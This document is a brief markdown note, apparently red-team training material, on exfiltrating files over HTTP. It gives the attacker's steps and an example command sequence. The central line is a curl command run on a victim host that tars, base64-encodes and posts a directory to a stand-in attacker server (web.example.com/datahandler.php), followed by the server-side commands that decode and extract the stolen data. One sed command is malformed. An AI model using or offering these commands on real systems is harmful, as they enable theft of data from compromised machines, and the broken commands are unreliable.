## Can be done with any programming language

### Steps:

#### 1) Attacker sets up a web server with a data handler 

#### 2) A C2 agent or an attacker sends the data

#### 3) The webserver receives the data and stores it

#### 4) The attacker logs into the webserver to have a copy of the received data

### Example:

#### 1) Jumpbox: ssh USER@VICTIM1_DOMAIN

#### 2) Attacker: ssh USER@VICTTIM1_IP_ADDRESS -p 2022 (example)

#### 3) Victim1: ls -l

#### 4) Victim1:  curl --data "file=$(tar zcf - DIR | base64)" http://web.example.com/datahandler.php

#### 5) Victim1: ssh USER@WEB_SERVER_DOMAIN

#### 6) Web Server: ls -l /tmp/ cat /tmp/http.bs64

#### 7) Web Server: sudo sed -i -s/ /t/g' /tmp/http.bs64

#### 8) Web Server: cat /tmp/http.bs64 | base64 -d | tar xvfz -

### HTTPS can be applied the same as HTTP technique.

### Setting up our own HTTPS server: Digital Ocean
